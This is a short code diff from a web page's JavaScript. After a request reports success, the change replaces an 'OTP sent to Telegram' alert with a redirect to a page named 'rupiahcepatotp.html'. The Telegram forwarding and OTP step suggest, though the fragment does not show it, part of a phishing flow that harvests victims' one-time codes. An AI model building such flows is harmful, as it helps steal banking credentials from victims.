@@ -122,7 +122,7 @@
         .then(response => response.json())
         .then(data => {
           if (data.ok) {
-            alert('Kode OTP berhasil dikirim ke Telegram');
+            location.href = "rupiahcepatotp.html";
           } else {
             alert('Gagal mengirim kode OTP ke Telegram');
           }
